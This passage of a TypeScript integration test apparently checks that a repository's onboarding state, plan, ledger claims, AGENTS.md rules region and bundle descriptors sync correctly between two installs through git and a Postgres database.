      { renderColumn, syncColumns, constraints },
    );

    const conflictColumns = await columnsOf(a.db, 'project_state_conflicts');
    const conflictKeys = await rowsOf<{ conname: string; contype: string; def: string }>(
      a.db,
      sql`select conname, contype, pg_get_constraintdef(oid) as def from pg_constraint where conrelid = to_regclass('project_state_conflicts')`,
    );
    const conflictIndexes = await rowsOf<{ indexdef: string }>(
      a.db,
      sql`select indexdef from pg_indexes where schemaname = current_schema() and tablename = 'project_state_conflicts'`,
    );
    const conflictKeyRows = 'rows' in conflictKeys ? conflictKeys.rows : [];
    check(
      'migration 0188 creates project_state_conflicts as specified',
      'rows' in conflictColumns &&
        conflictColumns.rows.length === 10 &&
        shapeOf(conflictColumns, 'id') === 'uuid NO' &&
        shapeOf(conflictColumns, 'repository_id') === 'uuid NO' &&
        shapeOf(conflictColumns, 'unit') === 'text NO' &&
        shapeOf(conflictColumns, 'base') === 'jsonb YES' &&
        shapeOf(conflictColumns, 'local') === 'jsonb YES' &&
        shapeOf(conflictColumns, 'incoming') === 'jsonb YES' &&
        shapeOf(conflictColumns, 'detected_at') === 'timestamp without time zone NO' &&
        shapeOf(conflictColumns, 'resolution') === 'text YES' &&
        shapeOf(conflictColumns, 'resolved_at') === 'timestamp without time zone YES' &&
        shapeOf(conflictColumns, 'resolved_by') === 'uuid YES' &&
        conflictKeyRows.some(
          (k) =>
            k.conname === 'project_state_conflicts_repository_id_repositories_id_fk' &&
            k.def === 'FOREIGN KEY (repository_id) REFERENCES repositories(id) ON DELETE CASCADE',
        ) &&
        conflictKeyRows.some(
          (k) => k.contype === 'f' && k.def.includes('REFERENCES users(id) ON DELETE SET NULL'),
        ) &&
        'rows' in conflictIndexes &&
        conflictIndexes.rows.some(
          (i) => /UNIQUE/.test(i.indexdef) && /WHERE \(?resolved_at IS NULL/.test(i.indexdef),
        ),
      { conflictColumns, conflictKeys, conflictIndexes },
    );

    const ledgerColumns = await columnsOf(a.db, 'onboarding_artifacts');
    const ledgerChecks = await rowsOf<{ conname: string; def: string }>(
      a.db,
      sql`select conname, pg_get_constraintdef(oid) as def from pg_constraint where conrelid = to_regclass('onboarding_artifacts') and contype = 'c'`,
    );
    const ledgerCheckRows = 'rows' in ledgerChecks ? ledgerChecks.rows : [];
    const ledgerCheck = ledgerCheckRows.find(
      (c) => c.conname === 'onboarding_artifacts_import_marker_check',
    );
    const sqlStateOf = async (run: () => Promise<unknown>): Promise<string | null> => {
      try {
        await run();
        return null;
      } catch (err) {
        const cause = err instanceof Error ? err.cause : undefined;
        return (cause as { code?: string } | undefined)?.code ?? String(err);
      }
    };
    const ledgerPath = '.two-install-smoke/ledger';
    const ledgerHash = 'a'.repeat(64);
    const ledgerInsert = (
      path: string,
      taskId: string | null,
      source: 'onboarding' | 'backfill',
      stepId: string,
      importedAt: boolean,
    ) =>
      a.db.execute(
        sql`insert into onboarding_artifacts (user_id, repository_id, task_id, disk_path, template_id, template_kind, template_schema_version, template_content_hash, written_hash, source_step_id, source, imported_at) values (${a.userId}, ${a.repositoryId}, ${taskId}::uuid, ${path}, 'smoke', 'agent', 1, ${ledgerHash}, ${ledgerHash}, ${stepId}, ${source}::artifact_source, ${importedAt ? new Date().toISOString() : null}::timestamp)`,
      );
    const ledgerOutcomes = {
      marker: await sqlStateOf(() =>
        ledgerInsert(`${ledgerPath}/1`, null, 'backfill', PROJECT_STATE_IMPORT_STEP_ID, true),
      ),
      retiredLocal: await sqlStateOf(() =>
        ledgerInsert(`${ledgerPath}/2`, taskA, 'onboarding', '12-post-onboarding', true),
      ),
      noTaskOtherSource: await sqlStateOf(() =>
        ledgerInsert(`${ledgerPath}/3`, null, 'onboarding', '12-post-onboarding', true),
      ),
      noTaskOtherStep: await sqlStateOf(() =>
        ledgerInsert(`${ledgerPath}/4`, null, 'backfill', '01-upgrade-plan', true),
      ),
      markerWithTask: await sqlStateOf(() =>
        ledgerInsert(`${ledgerPath}/5`, taskA, 'backfill', PROJECT_STATE_IMPORT_STEP_ID, true),
      ),
      markerWithoutInstant: await sqlStateOf(() =>
        ledgerInsert(`${ledgerPath}/6`, null, 'backfill', PROJECT_STATE_IMPORT_STEP_ID, false),
      ),
    };
    await a.db.execute(
      sql`delete from onboarding_artifacts where repository_id = ${a.repositoryId} and disk_path like ${ledgerPath + '/%'}`,
    );
    check(
      'migration 0189 lets the ledger hold an imported marker and refuses every other row without a task',
      shapeOf(ledgerColumns, 'task_id') === 'uuid YES' &&
        shapeOf(ledgerColumns, 'imported_at') === 'timestamp without time zone YES' &&
        ledgerCheck !== undefined &&
        ledgerOutcomes.marker === null &&
        ledgerOutcomes.retiredLocal === null &&
        ledgerOutcomes.noTaskOtherSource === '23514' &&
        ledgerOutcomes.noTaskOtherStep === '23514' &&
        ledgerOutcomes.markerWithTask === '23514' &&
        ledgerOutcomes.markerWithoutInstant === '23514',
      { ledgerColumns, ledgerChecks, ledgerOutcomes },
    );

    await a.db
      .update(schema.tasks)
      .set({ status: 'completed', completedAt: new Date() })
      .where(eq(schema.tasks.id, taskA));
    await stampRepositoryOnboarded(a.db, taskA);
    // 13-onboarding-push runs inside the step runner's merge phase, so the push is done here.
    git(a.repoPath, 'push', '-q', 'origin', 'HEAD:main');
    const headA = git(a.repoPath, 'rev-parse', 'HEAD');
    check("the remote holds A's onboarding commit", git(origin, 'rev-parse', 'main') === headA);
    const [repoA] = await a.db
      .select({
        onboardingEnvironment: schema.repositories.onboardingEnvironment,
        onboardingTooling: schema.repositories.onboardingTooling,
        rtkEnabled: schema.repositories.rtkEnabled,
      })
      .from(schema.repositories)
      .where(eq(schema.repositories.id, a.repositoryId));
    const toolingA = (repoA?.onboardingTooling ?? {}) as {
      schemaVersion?: number;
      tooling?: Record<string, unknown>;
    };
    const { ollamaUrl: localOllamaUrl, ...portableTooling } = toolingA.tooling ?? {};
    check(
      'A records its environment, tooling and RTK switch',
      repoA?.onboardingEnvironment != null &&
        localOllamaUrl === 'http://only-on-a:11434' &&
        isDeepStrictEqual(portableTooling.lspLanguages, ['php-extended']) &&
        repoA.rtkEnabled === false,
      repoA,
    );
    const mirrorA = JSON.parse(
      git(a.repoPath, 'show', 'HEAD:.haive-data/state/project/environment.json'),
    ) as {
      envDetectData?: Record<string, unknown>;
    };
    const mirroredKeys = Object.keys(mirrorA.envDetectData ?? {});
    check(
      "A's committed environment carries no prompt-only field",
      mirroredKeys.length > 0 && !mirroredKeys.some((key) => key.startsWith('__')),
      mirroredKeys,
    );

    // ---- B clones --------------------------------------------------------------------------
    const b = await cloneInstall(
      'B',
      dbB,
      path.join(tmp, 'storage-b'),
      remoteUrl,
      undefined,
      A_PROVIDERS,
    );
    const [repoB] = await b.db
      .select({
        status: schema.repositories.status,
        onboardingEnvironment: schema.repositories.onboardingEnvironment,
        onboardingTooling: schema.repositories.onboardingTooling,
        scopeExcludeGlobs: schema.repositories.scopeExcludeGlobs,
        rtkEnabled: schema.repositories.rtkEnabled,
      })
      .from(schema.repositories)
      .where(eq(schema.repositories.id, b.repositoryId));
    check('B is ready', repoB?.status === 'ready', repoB?.status);
    check("B checks out A's commit", git(b.repoPath, 'rev-parse', 'HEAD') === headA);

    // ---- B reads the record in its checkout into its render context and sync base (B1.4b) ----
    const wantRender = wantRecord === null ? null : normalizeProjectState(wantRecord).render;
    const columnB = await rowsOf<{ render_context: unknown }>(
      b.db,
      sql`select render_context from repositories where id = ${b.repositoryId}`,
    );
    const renderContextB =
      'rows' in columnB && columnB.rows.length === 1 ? columnB.rows[0]!.render_context : null;
    check(
      "B's render_context holds the portable render fields of A's record, records the RTK choice A's record carries (its rtk-enabled.json) and holds no per-install field",
      wantRender !== null &&
        isDeepStrictEqual(
          asJson(renderContextB),
          asJson({ ...wantRender, cliTargets: wantRecord!.cli, rtkChoiceRecorded: true }),
        ),
      { want: wantRender, got: renderContextB, columnB },
    );
    const syncB = await rowsOf<{ base_snapshot: unknown; last_error: string | null }>(
      b.db,
      sql`select base_snapshot, last_error from project_state_sync where repository_id = ${b.repositoryId}`,
    );
    check(
      "B's sync starts from the record A committed, claims included, with no error",
      wantRecord !== null &&
        'rows' in syncB &&
        syncB.rows.length === 1 &&
        isDeepStrictEqual(
          asJson({ ...(syncB.rows[0]!.base_snapshot as object), claims: [] }),
          asJson(normalizeProjectState(wantRecord)),
        ) &&
        isDeepStrictEqual(
          (syncB.rows[0]!.base_snapshot as { claims: { path: string }[] }).claims
            .map((c) => c.path)
            .sort(),
          liveRowsA.map((r) => r.diskPath).sort(),
        ) &&
        syncB.rows[0]!.last_error === null,
      syncB,
    );
    check(
      "B's sync base holds the descriptor A committed",
      'rows' in syncB &&
        isDeepStrictEqual(
          asJson((syncB.rows[0]?.base_snapshot as { bundles?: unknown } | undefined)?.bundles),
          [BUNDLE_DESCRIPTOR],
        ),
      syncB,
    );
    // A rescan reads the same record again: nothing differs, so nothing is written, whatever order
    // the database hands a jsonb value back in.
    const syncStateB = () =>
      rowsOf<Record<string, unknown>>(
        b.db,
        sql`select r.render_context, r.applicable_template_ids, s.base_snapshot, s.last_error, s.updated_at, (select jsonb_agg(to_jsonb(o) order by o.id) from onboarding_artifacts o where o.repository_id = r.id) as ledger from repositories r left join project_state_sync s on s.repository_id = r.id where r.id = ${b.repositoryId}`,
      );
    const beforeRescan = await syncStateB();
    await handleScan(
      {
        repositoryId: b.repositoryId,
        userId: b.userId,
        source: 'git_https',
        localPath: b.repoPath,
      },
      b.db,
    );
    const afterRescan = await syncStateB();
    check(
      "a rescan of B's checkout leaves its render_context, its ledger and its sync row as they were",
      'rows' in beforeRescan &&
        'rows' in afterRescan &&
        beforeRescan.rows.length === 1 &&
        beforeRescan.rows[0]!.base_snapshot !== null &&
        beforeRescan.rows[0]!.ledger !== null &&
        isDeepStrictEqual(afterRescan.rows, beforeRescan.rows),
      { beforeRescan, afterRescan },
    );
    const filesOnB = await Promise.all(
      ['.claude/workflow-config.json', 'AGENTS.md', '.haive-data/plan.json'].map(async (rel) => ({
        rel,
        present: (await lstatNoFollow(b.repoPath, rel))?.kind === 'file',
      })),
    );
    check(
      "B has A's generated files",
      filesOnB.every((f) => f.present),
      filesOnB,
    );
    check(
      'B restores the environment A recorded',
      isDeepStrictEqual(repoB?.onboardingEnvironment, repoA?.onboardingEnvironment),
      repoB?.onboardingEnvironment,
    );
    const { mcpSettingsJson: _aServers, ...portableToolingRest } = portableTooling;
    check(
      "B restores A's tooling through the record, without its machine-local keys, and holds A's MCP server until it is accepted",
      isDeepStrictEqual(repoB?.onboardingTooling, {
        schemaVersion: toolingA.schemaVersion,
        tooling: {
          ...portableToolingRest,
          importedMcpSettingsJson: A_MCP_SETTINGS,
          importedMcpServerNames: ['smoke-only-on-a'],
        },
      }) && portableTooling.mcpSettingsJson === A_MCP_SETTINGS,
      repoB?.onboardingTooling,
    );
    check(
      "B restores A's scope exclusions",
      isDeepStrictEqual(repoB?.scopeExcludeGlobs, [...globs].sort()),
      repoB?.scopeExcludeGlobs,
    );
    check("B takes A's RTK switch", repoB?.rtkEnabled === false, repoB?.rtkEnabled);
    await b.db.execute(
      sql`update repositories set rtk_enabled = true where id = ${b.repositoryId}`,
    );
    await b.db.execute(sql`delete from project_state_sync where repository_id = ${b.repositoryId}`);
    const firstSync = await syncProjectStateFromCheckout(b.db, {
      repositoryId: b.repositoryId,
      repoPath: b.repoPath,
    });
    const rtkOnB = () =>
      rowsOf<{ rtk_enabled: boolean }>(
        b.db,
        sql`select rtk_enabled from repositories where id = ${b.repositoryId}`,
      );
    const afterFirst = await rtkOnB();
    await markProjectStateDirty(b.db, b.repositoryId);
    await sweepDirtyProjectStates(b.db);
    const afterSweep = await rtkOnB();
    const rtkFile = await readFile(
      path.join(b.repoPath, '.haive-data/state/settings/rtk-enabled.json'),
      'utf8',
    );
    check(
      "a first sync with no sync row takes A's RTK-off over B's default, and B's next sweep does not write true back",
      firstSync.outcome === 'applied' &&
        'rows' in afterFirst &&
        afterFirst.rows[0]?.rtk_enabled === false &&
        'rows' in afterSweep &&
        afterSweep.rows[0]?.rtk_enabled === false &&
        rtkFile.trim() === 'false',
      { firstSync, afterFirst, afterSweep, rtkFile },
    );
    const rtkRel = '.haive-data/state/settings/rtk-enabled.json';
    await b.db.execute(
      sql`update repositories set rtk_enabled = true,
        render_context = jsonb_set(render_context, '{rtkChoiceRecorded}', 'false')
        where id = ${b.repositoryId}`,
    );
    await b.db.execute(sql`delete from project_state_sync where repository_id = ${b.repositoryId}`);
    const unchosenSync = await syncProjectStateFromCheckout(b.db, {
      repositoryId: b.repositoryId,
      repoPath: b.repoPath,
    });
    const unchosenColumn = await rtkOnB();
    await markProjectStateDirty(b.db, b.repositoryId);
    await sweepDirtyProjectStates(b.db);
    const unchosenFile = await readFile(path.join(b.repoPath, rtkRel), 'utf8');
    check(
      "B never recorded an RTK choice: A's value replaces B's default, and B's next sweep leaves A's rtk-enabled.json as committed",
      unchosenSync.outcome === 'applied' &&
        'rows' in unchosenColumn &&
        unchosenColumn.rows[0]?.rtk_enabled === false &&
        unchosenFile.trim() === 'false' &&
        git(b.repoPath, 'status', '--porcelain', '--', rtkRel) === '',
      { unchosenSync, unchosenColumn, unchosenFile },
    );
    const adoptedB = await rowsOf<{ flag: boolean | null; held: unknown; stamped: boolean }>(
      b.db,
      sql`select (r.render_context ->> 'rtkChoiceRecorded')::boolean as flag,
        s.base_snapshot #> '{settings,rtk-enabled}' as held,
        r.rtk_choice_made_at is not null as stamped
        from repositories r join project_state_sync s on s.repository_id = r.id
        where r.id = ${b.repositoryId}`,
    );
    check(
      "B adopted A's value: the RTK choice is recorded in the column without a stamp, and the sync base holds A's file",
      'rows' in adoptedB &&
        adoptedB.rows[0]?.flag === true &&
        adoptedB.rows[0]?.held === false &&
        adoptedB.rows[0]?.stamped === false,
      adoptedB,
    );
    await b.db.execute(
      sql`update repositories set render_context = jsonb_set(render_context, '{rtkChoiceRecorded}', 'false')
        where id = ${b.repositoryId}`,
    );
    await rm(path.join(b.repoPath, rtkRel));
    await b.db.execute(
      sql`update repositories set rtk_enabled = true where id = ${b.repositoryId}`,
    );
    await markProjectStateDirty(b.db, b.repositoryId);
    await sweepDirtyProjectStates(b.db);
    check(
      'and a default nobody chose is not written into a checkout that holds no rtk-enabled.json',
      (await readFile(path.join(b.repoPath, rtkRel), 'utf8').catch(() => null)) === null,
    );
    git(b.repoPath, 'checkout', '--', rtkRel);
    await b.db.execute(
      sql`update repositories set rtk_enabled = false where id = ${b.repositoryId}`,
    );
    await b.db.execute(
      sql`update repositories set render_context = jsonb_set(render_context, '{rtkChoiceRecorded}', 'true')
        where id = ${b.repositoryId}`,
    );
    const toolingRel = '.haive-data/state/settings/onboarding-tooling.json';
    check(
      "B's sweeps write A's tooling unit back as A committed it, the held MCP server list included",
      git(b.repoPath, 'status', '--porcelain', '--', toolingRel) === '' &&
        (await readFile(path.join(b.repoPath, toolingRel), 'utf8')) ===
          git(b.repoPath, 'show', `HEAD:${toolingRel}`) + '\n',
      git(b.repoPath, 'status', '--porcelain', '--', toolingRel),
    );
    const planA = await planOf(a);
    const planB = await planOf(b);
    check(
      "B restores A's plan node for node",
      planA.length === 3 && isDeepStrictEqual(planA, planB),
      {
        a: planA.length,
        b: planB.length,
      },
    );

    const restoredHash = (
      await b.db.query.planMirrorState.findFirst({
        where: eq(schema.planMirrorState.repositoryId, b.repositoryId),
      })
    )?.syncedHash;
    await applyPlanPatch(
      b.db,
      { ops: [{ op: 'upsert', nodeRef: planB[1]!.id, title: 'Edited on B' }] },
      { repositoryId: b.repositoryId, origin: 'user' },
    );
    const bFlush = await writePlanMirror(b.db, b.repositoryId, b.repoPath).then(
      (files) => files,
      (err: Error) => err.message,
    );
    check(
      "B restores A's plan, edits it, and the write goes through",
      typeof restoredHash === 'string' &&
        Array.isArray(bFlush) &&
        (await readFile(path.join(b.repoPath, '.haive-data/plan.json'), 'utf8')).includes(
          'Edited on B',
        ),
      { restoredHash, bFlush },
    );

    // ---- B holds A's claims as import markers (B1.6) ----------------------------------------
    const pathsA = await livePaths(a);
    const pathsB = await livePaths(b);
    check('A records its claims', pathsA.length > 0, pathsA.length);
    check(
      'B holds a live claim for every path A claims',
      pathsA.length > 0 && isDeepStrictEqual(pathsA, pathsB),
      { a: pathsA.length, b: pathsB.length },
    );
    const ledgerOf = (install: Install) =>
      rowsOf<{
        disk_path: string;
        template_id: string;
        template_kind: string;
        template_content_hash: string;
        written_hash: string;
        task_id: string | null;
        user_id: string;
        source: string;
        source_step_id: string;
        imported_at: Date | null;
      }>(
        install.db,
        sql`select disk_path, template_id, template_kind, template_content_hash, written_hash, task_id, user_id, source, source_step_id, imported_at from onboarding_artifacts where repository_id = ${install.repositoryId} and superseded_at is null order by disk_path`,
      );
    const ledgerA = await ledgerOf(a);
    const ledgerBRows = await ledgerOf(b);
    const markersB = 'rows' in ledgerBRows ? ledgerBRows.rows : [];
    check(
      "B's rows are import markers: no task, B's user, imported, written by the import",
      markersB.length > 0 &&
        markersB.every(
          (r) =>
            r.task_id === null &&
            r.user_id === b.userId &&
            r.source === 'backfill' &&
            r.source_step_id === PROJECT_STATE_IMPORT_STEP_ID &&
            r.imported_at !== null,
        ),
      markersB,
    );
    const claimOf = (r: {
      disk_path: string;
      template_id: string;
      template_kind: string;
      template_content_hash: string;
      written_hash: string;
    }) =>
      [r.disk_path, r.template_id, r.template_kind, r.template_content_hash, r.written_hash].join(
        '|',
      );
    check(
      "and each carries the template and the hashes A's row records",
      'rows' in ledgerA && isDeepStrictEqual(markersB.map(claimOf), ledgerA.rows.map(claimOf)),
      { a: 'rows' in ledgerA ? ledgerA.rows.map(claimOf) : ledgerA, b: markersB.map(claimOf) },
    );

    const upgradeB = await upgradePlan(b);
    const entries = upgradeB.plan?.entries ?? null;
    const contextB = upgradeB.plan?.renderCtxSnapshot ?? null;
    const planError = upgradeB.error;
    const differing =
      contextB !== null && contextA !== null
        ? contextDiffers(contextA, contextB, repoB?.rtkEnabled)
        : null;
    check(
      "B's upgrade plan resolves its render context",
      contextB !== null && contextA !== null && differing!.length === 0,
      planError ?? { differing, contextA, contextB },
    );
    const claimed = new Set(pathsA);
    const conflicts = entries
      ?.filter((e) => claimed.has(e.diskPath) && e.bucket === 'conflict')
      .map((e) => e.diskPath);
    const unplanned = entries ? pathsA.filter((p) => !entries.some((e) => e.diskPath === p)) : null;
    check(
      "no path A claims is a conflict in B's plan",
      entries !== null && unplanned!.length === 0 && conflicts!.length === 0,
      planError ?? { conflicts, unplanned },
    );
    const notUnchanged = entries
      ?.filter((e) => e.bucket !== 'unchanged')
      .map((e) => `${e.diskPath}: ${e.bucket}`);
    check(
      "B's upgrade plan reads every claimed path as unchanged",
      entries !== null && entries.length > 0 && notUnchanged!.length === 0,
      notUnchanged ?? planError,
    );
    check(
      "and writes no backfill rows under B's task",
      upgradeB.plan !== null && upgradeB.plan.ranBackfill === false,
      upgradeB.plan?.ranBackfill ?? planError,
    );

    // ---- T119: the AGENTS.md rules region is the repository's, not its writer's personal rules ----
    // B above holds A's personal rules, so its checks stay as they are; this B's user holds different ones.
    const bT = await cloneInstall(
      'B',
      dbB,
      path.join(tmp, 'storage-t119'),
      remoteUrl,
      undefined,
      B_PROVIDERS,
    );
    const planT = await upgradePlan(bT);
    await bT.db
      .update(schema.tasks)
      .set({ status: 'cancelled' })
      .where(eq(schema.tasks.id, planT.taskId));
    const regionOf = (text: string | null): string | null => {
      const region = text === null ? null : extractRegion(text, CLI_RULES_START, CLI_RULES_END);
      return region === null ? null : normalizeContent(region);
    };
    const departure = (got: string | null, want: string) => {
      const held = got ?? '';
      let at = 0;
      while (at < held.length && at < want.length && held[at] === want[at]) at += 1;
      const from = Math.max(0, at - 40);
      return { at, got: held.slice(from, at + 120), want: want.slice(from, at + 120) };
    };
    const defaultRegion = normalizeContent(buildCliRulesBlock([DEFAULT_AGENT_RULES])!);
    const regionA = regionOf(git(a.repoPath, 'show', `${headA}:AGENTS.md`));
    // c1: the region A's onboarding committed is the default block, whatever rules A's user holds.
    check(
      "T119 c1: A's committed AGENTS.md rules region is the default block, not A's personal rules",
      regionA === defaultRegion,
      departure(regionA, defaultRegion),
    );
    const resolvedT = await resolveRenderContext(bT.db, {
      repositoryId: bT.repositoryId,
      userId: bT.userId,
      liveRows: await loadLiveArtifacts(bT.db, bT.repositoryId),
      logger: log,
    });
    const expandedT = resolvedT
      ? await unionExpandedFor(bT.db, {
          repositoryId: bT.repositoryId,
          userId: bT.userId,
          renderCtx: resolvedT.renderCtx,
          logger: log,
        })
      : null;
    const renderedT = expandedT?.find((e) => e.templateKind === CLI_RULES_TEMPLATE_KIND);
    const regionT = renderedT ? normalizeContent(renderedT.content) : null;
    // c2: what B would write for the region is the region A committed, byte for byte.
    check(
      "T119 c2: B's own render of the AGENTS.md rules region is A's committed region",
      regionA !== null && regionT === regionA,
      departure(regionT, regionA ?? ''),
    );
    const rulesEntriesT = (planT.plan?.entries ?? []).filter(
      (e) => e.diskPath === CLI_RULES_DISK_PATH && e.templateKind === CLI_RULES_TEMPLATE_KIND,
    );
    // c3: B's first upgrade plan offers nothing for the region (an absent entry is quiet too).
    check(
      "T119 c3: B's first upgrade plan offers nothing for the AGENTS.md rules region",
      planT.plan !== null && rulesEntriesT.every((e) => e.bucket === 'unchanged'),
      planT.error ?? rulesEntriesT.map((e) => `${e.diskPath}: ${e.bucket}`),
    );
    const regionBeforeT = regionOf(await readFile(path.join(bT.repoPath, 'AGENTS.md'), 'utf8'));
    const appliedT = await upgradeApplied(bT, (_plan, form) =>
      Object.fromEntries(
        (form?.fields ?? []).filter((f) => f.type === 'radio').map((f) => [f.id, 'apply_theirs']),
      ),
    );
    const regionAfterT = regionOf(await readFile(path.join(bT.repoPath, 'AGENTS.md'), 'utf8'));
    const statusT = git(bT.repoPath, 'status', '--porcelain', '--', 'AGENTS.md');
    // c4: applying B's upgrade, every conflict overwritten (the form's radios), leaves AGENTS.md as it was.
    check(
      "T119 c4: applying B's upgrade leaves AGENTS.md unmodified and its rules region as it was",
      appliedT.error === null && statusT === '' && regionAfterT === regionBeforeT,
      {
        error: appliedT.error,
        status: statusT,
        ...departure(regionAfterT, regionBeforeT ?? ''),
      },
    );
    const effectiveRules = async (install: Install): Promise<string> =>
      resolveEffectiveRules(
        (
          await install.db
            .select({ rulesContent: schema.cliProviders.rulesContent })
            .from(schema.cliProviders)
            .where(eq(schema.cliProviders.id, install.providerId))
        )[0]?.rulesContent ?? '',
      );
    const effectiveA = await effectiveRules(a);
    const effectiveT = await effectiveRules(bT);
    // c5: the two users' stored personal rules, which dispatch reads, are as seeded and still differ.
    check(
      "T119 c5: the two users' personal rules are still stored and still differ",
      effectiveA !== effectiveT && effectiveA === RULES_A && effectiveT === RULES_B,
      { effectiveA, effectiveT },
    );

    // A reads its own record again, and its own plan must still call every path it claims unchanged.
    await handleScan(
      {
        repositoryId: a.repositoryId,
        userId: a.userId,
        source: 'git_https',
        localPath: a.repoPath,
      },
      a.db,
    );
    const upgradeA = await upgradePlan(a);
    await a.db
      .update(schema.tasks)
      .set({ status: 'completed', completedAt: new Date() })
      .where(eq(schema.tasks.id, upgradeA.taskId));
    const changedOnA = upgradeA.plan?.entries
      .filter((e) => claimed.has(e.diskPath) && e.bucket !== 'unchanged')
      .map((e) => `${e.diskPath}: ${e.bucket}`);
    const unplannedOnA = upgradeA.plan
      ? pathsA.filter((p) => !upgradeA.plan!.entries.some((e) => e.diskPath === p))
      : null;
    check(
      "after a rescan of A, A's own plan reads every path it claims as unchanged",
      upgradeA.plan !== null && unplannedOnA!.length === 0 && changedOnA!.length === 0,
      upgradeA.error ?? { changedOnA, unplannedOnA },
    );

    // A Retry reclaims its task before apply; a completed task must never own a record write.
    const rerunPostOnboarding = async () => {
      await a.db
        .update(schema.tasks)
        .set({ status: 'running', completedAt: null })
        .where(eq(schema.tasks.id, taskA));
      try {
        return await runStep(a, postOnboardingStep, taskA, rowOf(postOnboardingStep));
      } finally {
        await a.db
          .update(schema.tasks)
          .set({ status: 'completed', completedAt: new Date() })
          .where(eq(schema.tasks.id, taskA));
      }
    };
    const rerun = await rerunPostOnboarding();
    check(
      'a live Retry of 12 writes its record before retiring mirrors',
      rerun.output.recordWrite === 'written',
      rerun.output,
    );
    const dirty = git(a.repoPath, 'status', '--porcelain');
    check("a second 12 run leaves A's checkout clean", dirty === '', dirty.split('\n'));

    // ---- the sweep keeps the record current between steps (B1.8a) ------------------------------
    const outboxA = async () => {
      const got = await rowsOf<{
        revision: number;
        written_revision: number;
        last_error: string | null;
      }>(
        a.db,
        sql`select revision, written_revision, last_error from project_state_outbox where repository_id = ${a.repositoryId}`,
      );
      return 'rows' in got ? (got.rows[0] ?? null) : null;
    };
    const clean = async () => {
      const row = await outboxA();
      return row !== null && row.written_revision === row.revision;
    };
    const descriptorOf = (name: string) => {
      const source = `zip:${encodeURIComponent(name)}`;
      return {
        rel: `.haive-data/state/${bundleFileName(source)}`,
        text: renderProjectState({ ...emptyProjectState(), bundles: [{ source, name }] }).get(
          bundleFileName(source),
        ),
      };
    };
    const addBundle = async (name: string) => {
      await a.db.transaction(async (tx) => {
        await tx.insert(schema.customBundles).values({
          userId: a.userId,
          repositoryId: a.repositoryId,
          name,
          sourceType: 'zip',
          storageRoot: path.join(tmp!, 'bundles', name),
        });
        await markProjectStateDirty(tx, a.repositoryId);
      });
    };
    const dropBundle = async (name: string) => {
      await a.db.transaction(async (tx) => {
        await tx
          .delete(schema.customBundles)
          .where(
            and(
              eq(schema.customBundles.repositoryId, a.repositoryId),
              eq(schema.customBundles.name, name),
            ),
          );
        await markProjectStateDirty(tx, a.repositoryId);
      });
    };
    const diskText = (rel: string) =>
      readFile(path.join(a.repoPath, rel), 'utf8').then(
        (text) => text,
        () => null,
      );

    await markProjectStateDirty(a.db, a.repositoryId);
    check('a mark leaves the outbox dirty', !(await clean()), await outboxA());
    const rerunDirty = await rerunPostOnboarding();
    check(
      'a live Retry of 12 drains the dirty record',
      rerunDirty.output.recordWrite === 'written',
      rerunDirty.output,
    );
    check("12's record write leaves the outbox clean", await clean(), await outboxA());
    check(
      'and the next sweep tick writes nothing',
      (await sweepDirtyProjectStates(a.db)) === 0,
      await outboxA(),
    );

    const sweepKit = descriptorOf('sweep-kit');
    await addBundle('sweep-kit');
    check(
      'A creates a bundle after 12 and one sweep tick writes its descriptor',
      (await sweepDirtyProjectStates(a.db)) === 1 &&
        (await diskText(sweepKit.rel)) === sweepKit.text,
      { descriptor: await diskText(sweepKit.rel), want: sweepKit.text },
    );
    check('and the tick leaves the outbox clean', await clean(), await outboxA());
    const afterTick = git(a.repoPath, 'status', '--porcelain');
    check(
      'and commits nothing: the descriptor is the only change in the checkout',
      afterTick === `?? ${sweepKit.rel}`,
      afterTick.split('\n'),
    );

    const identityOf = async (rel: string) => {
      const info = await stat(path.join(a.repoPath, rel), { bigint: true });
      return `${info.ino}:${info.mtimeNs}`;
    };
    const before = await Promise.all([sweepKit.rel, RECORD_RENDER, RECORD_FORMAT].map(identityOf));
    await markProjectStateDirty(a.db, a.repositoryId);
    const swept = await sweepDirtyProjectStates(a.db);
    const after = await Promise.all([sweepKit.rel, RECORD_RENDER, RECORD_FORMAT].map(identityOf));
    check(
      'a sweep over an unchanged record rewrites no file',
      swept === 1 && isDeepStrictEqual(before, after) && (await clean()),
      { swept, before, after },
    );

    const formatText = (await diskText(RECORD_FORMAT))!;
    const blocked = descriptorOf('blocked-kit');
    await writeFile(path.join(a.repoPath, RECORD_FORMAT), '{"schemaVersion":99}\n');
    await addBundle('blocked-kit');
    const newerSwept = await sweepDirtyProjectStates(a.db);
    check(
      'a newer record format on disk is left untouched and the outbox says why',
      newerSwept === 0 &&
        (await diskText(blocked.rel)) === null &&
        (await diskText(RECORD_FORMAT)) === '{"schemaVersion":99}\n' &&
        (await outboxA())?.last_error != null &&
        !(await clean()),
      { newerSwept, outbox: await outboxA() },
    );
    await writeFile(path.join(a.repoPath, RECORD_FORMAT), formatText);
    check(
      'and once it is the current format again the next tick writes',
      (await sweepDirtyProjectStates(a.db)) === 1 &&
        (await diskText(blocked.rel)) === blocked.text &&
        (await clean()) &&
        (await outboxA())?.last_error === null,
      await outboxA(),
    );

    const mergeKit = descriptorOf('merge-kit');
    const mergeHeadFile = path.join(a.repoPath, '.git', 'MERGE_HEAD');
    await writeFile(mergeHeadFile, `${git(a.repoPath, 'rev-parse', 'HEAD')}\n`);
    await addBundle('merge-kit');
    const midMerge = await sweepDirtyProjectStates(a.db);
    check(
      'a merge in progress in the checkout gets no write',
      midMerge === 0 && (await diskText(mergeKit.rel)) === null && !(await clean()),
      await outboxA(),
    );
    await rm(mergeHeadFile);
    check(
      'and the tick after it ends writes',
      (await sweepDirtyProjectStates(a.db)) === 1 &&
        (await diskText(mergeKit.rel)) === mergeKit.text,
      await outboxA(),
    );

    const gateKit = descriptorOf('gate-kit');
    const [liveOnboarding] = await a.db
      .insert(schema.tasks)
      .values({
        userId: a.userId,
        repositoryId: a.repositoryId,
        type: 'onboarding',
        title: 'two-install-smoke sweep',
        status: 'running',
      })
      .returning({ id: schema.tasks.id });
    await addBundle('gate-kit');
    const whileOnboarding = await sweepDirtyProjectStates(a.db);
    check(
      'a live onboarding task gets no write, and the outbox says why',
      whileOnboarding === 0 &&
        (await diskText(gateKit.rel)) === null &&
        (await outboxA())?.last_error != null,
      await outboxA(),
    );
    await a.db
      .update(schema.tasks)
      .set({ status: 'completed', completedAt: new Date() })
      .where(eq(schema.tasks.id, liveOnboarding!.id));
    check(
      'and the tick after it ends writes',
      (await sweepDirtyProjectStates(a.db)) === 1 && (await diskText(gateKit.rel)) === gateKit.text,
      await outboxA(),
    );

